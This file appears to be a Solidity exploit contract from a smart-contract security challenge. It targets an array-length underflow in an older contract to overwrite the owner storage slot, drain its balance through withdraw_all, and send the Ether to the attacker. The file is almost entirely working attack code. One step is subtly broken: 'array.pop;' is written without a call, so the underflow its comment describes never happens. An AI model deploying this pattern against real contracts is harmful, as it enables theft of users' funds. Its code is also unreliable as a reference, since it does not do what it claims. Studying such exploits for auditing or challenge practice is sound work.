// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

/*
 * The goal of the exploit is to overwrite the owner slot on the array contract
 * with the address of this contract and withdraw all of the funds. Arrays in
 * earlier versions of solidity did not have checks to keep the length from
 * underflowing. With the knowledge of where we expect the first element's slot,
 * we can overwrite any slot (including the owner slot).
 */

import "hardhat/console.sol";

interface IArray {
    function owner() external returns (address);
    function push(bytes32) external;
    function pop() external;
    function edit(uint256, bytes32) external;
    function withdraw_all() external;
}

contract Exploit {
    IArray array;
    address owner;

    constructor(IArray _array) public {
        array = _array;
        owner = msg.sender;
    }

    function exploit() external {
        // 1. Underflow array to make it infinite length
        array.pop;
        array.pop;

        // 2. Calculate offset of which index is required to overwrite owner slot
        // Base offset will be at uint256(keccak256(abi.encode(1)));
        uint256 ele0 = uint256(keccak256(abi.encode(1)));
        uint256 offset = 0 - ele0;

        // 3. Overwrite owner slot with this address
        array.edit(offset, bytes32(uint256(address(this))));
        console.log(array.owner());

        // 4. Transfer money back to the creator of this contract
        // Solidity v0.5.0 uses this style overrides
        array.withdraw_all();

        console.logString("Balance on the way out is");
        console.logUint(address(this).balance);

        (bool sent,) = owner.call.value(address(this).balance)("");
        require(sent, "Failed to send Ether");
    }

    function () external payable {}
}
